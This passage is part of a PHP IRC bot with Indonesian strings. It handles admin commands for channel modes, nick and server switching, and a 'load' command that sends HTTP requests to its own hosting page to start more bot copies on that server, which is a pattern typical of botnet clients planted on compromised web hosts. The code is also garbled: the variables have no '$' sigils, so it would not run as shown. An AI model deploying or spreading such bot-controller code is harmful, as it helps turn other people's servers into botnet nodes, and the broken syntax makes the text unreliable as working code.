               elseif (com[3]==':`changenick') {
                 nick = nicky[rand(0,count(nicky) - 1)];
                 fputs(fp, 'NICK '.nick . CRL);
                 if (substr(dCommand,0,3)=='433') {
                   nick = nicky[rand(0,count(nicky) - 1)];
                   fputs(fp, 'NICK '.nick . CRL);
                 }
               }
               elseif (com[3]==':`op' && chan) {
                 if (com[4]) { opnick = com[4]; }
                 else { opnick = dNick; }
                 fputs(fp, 'MODE '.chan.' +ooo '.opnick.' '.com[5].' '.com[6] . CRL);
               }
               elseif (com[3]==':`deop' && chan) {
                 if (com[4]) { opnick = com[4]; }
                 else { opnick = dNick; }
                 fputs(fp, 'MODE '.chan.' -o+v-oo '.opnick.' '.opnick.' '.com[5].' '.com[6] . CRL);
               }
               elseif (com[3]==':`v' && chan) {
                 if (com[4]) { vonick = com[4]; }
                 else { vonick = dNick; }
                 fputs(fp, 'MODE '.chan.' +vvv '.vonick.' '.com[5].' '.com[6] . CRL);
               }
               elseif (com[3]==':`dv' && chan) {
                 if (com[4]) { vonick = com[4]; }
                 else { vonick = dNick; }
                 fputs(fp, 'MODE '.chan.' -vvv '.vonick.' '.com[5].' '.com[6] . CRL);
               }
               elseif (com[3]==':`awaymsg' && auth["dNick"]["status"]=="Admin") {
                 msg = strstr(data,":`awaymsg");
                 msg = str_replace(":`awaymsg","",msg);
                 if (strlen(msg)<3) {
                   raway="on";
                   fputs(fp,'AWAY : ' . 'AWAY' . CRL);
                 }
                 else {
                   raway="off";
                   fputs(fp,'AWAY : ' . msg . CRL);
                 }
               }
               elseif (com[3]==':`mode' && com[4] && chan) {
                 fputs(fp, 'MODE '.chan.' :'.com[4].' '.com[5] . CRL);
               }
               elseif (com[3]==':`nickmode' && com[4]) {
                 nickmode = com[4];
                 fputs(fp, 'MODE '.nick.' :'.nickmode . CRL);
               }
               elseif (com[3]==':`chanlist') {
                 fputs(fp, 'NOTICE '.dNick.' :Channel List: '.channels . CRL);
               }
               elseif (com[3]==':`userlist') {
                 userlist="";
                 foreach (auth as user) {
                   if (user["pass"]) { pass="-pass ok"; }
                   else { pass="-no pass"; }
                   userlist .= user["name"].'('.user["status"].pass.') ';
                 }
                 fputs(fp, 'NOTICE '.dNick.' :User List: '.userlist . CRL);
               }
               elseif (com[3]==':`quit' && auth["dNick"]["status"]=="Admin") {
                 msg = strstr(data,":`quit");
                 msg = str_replace(":`quit","",msg);
                 if (strlen(msg)>3) {
                   msg = str_replace(" ","_",msg);
                 }
                 quitmsg = quitmsglist[rand(0,count(quitmsglist) - 1)];
                 fputs(fp, 'QUIT ' . quitmsg . CRL);
                 keluar = 1;
                 exit;
               }
               elseif (com[3]==':`vhost' && auth["dNick"]["status"]=="Admin") {
                 if (com[4]) { localhost = com[4]; }
                 else { localhost = 'localhost'; }
                 keluar = 0;
                 fputs(fp, 'QUIT Ganti VHOST' . CRL);
               }
               elseif (com[3]==':`jump' && auth["dNick"]["status"]=="Admin") {
                 if (empty(com[4])) {
                   remotehost = remotehost2[rand(0,count(remotehost2) - 1)];
                 }
                 else { remotehost = com[4]; }
                 keluar = 0;
                 fputs(fp, "QUIT Ganti Server".CRL);
               }
               elseif (com[3]==':`ident' && auth["dNick"]["status"]=="Admin") {
                 if (!com[4]) { username = username; }
                 else { username = com[4]; }
                 keluar = 0;
                 fputs(fp, 'QUIT Ganti Ident ' . CRL);
               }
               elseif (com[3]==':`fullname' && auth["dNick"]["status"]=="Admin") {
                 if (!com[4]) { realname = "--"; }
                 else { realname = com[4]; }
                 keluar = 0;
                 fputs(fp, 'QUIT Ganti Nama' . CRL);
               }
               elseif (com[3]==':`topic' && com[4] && chan) {
                 msg = strstr(data,":`topic");
                 msg = str_replace(":`topic ","",msg);
                 fputs(fp, 'TOPIC '.chan.' :'.msg . CRL);
               }
               elseif (com[3]==':`load') {
                 if (auth["dNick"]["status"]=="Admin") {
                   bhost = _SERVER['HTTP_HOST'];
                   bruri = _SERVER['REQUEST_URI'];
                   if (com[4]) { jmlbot = com[4]; }
                   else { jmlbot = 1; }
                   for (i=1;i<=com[4];i++) {
                     soket = fsockopen(bhost,80,errno,errstr,10);
                     fputs(soket,"GET bruri HTTP/1.0\r\nHost: bhost\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n");
                     fclose(soket);
                   }
                   fputs(fp,"NOTICE dNick :".com[4]." Bot(s) loaded!".CRL);
                 }
               }
               elseif (com[3]==':!help' && !chan) {
                 fputs(fp,'PRIVMSG '.dNick.' :No Help!' . CRL);
               }
             }
           }
         }
         elseif (!auth["dNick"] && !eregi("auth",iText)) {
           if (eregi("www.",iText) || eregi("http:",iText) || eregi("join #",iText)) {
             if (!ereg("#",dCommand)) {
               if (log=="on") {
                 fputs(fp,'PRIVMSG '. admin .' :4inviter: ' . dFrom . '2:' .iText. CRL);
               }
               inv = strstr(dFrom,'@');
               foreach (auth as user) {
                 if (user["status"]=="user") {
                   fputs(fp, 'NOTICE '.user["name"].' :KB '.chan.' '.dNick.' '.inv.'' . CRL);
                 }
               }
             }
           }
           elseif (!ereg("#",dCommand)) {
             if (log=="on") {
               fputs(fp,'PRIVMSG '.admin.' :6' . dFrom . '12:' .iText. CRL);
             }
           }
         }
       }
     }
     elseif (substr(data,0,4) == 'PING') {
       fputs(fp,'PONG ' . substr(data,5) . CRL);
     }
   }
 }
 fclose(fp);
} while (keluar == 0);
}

rx();

?>
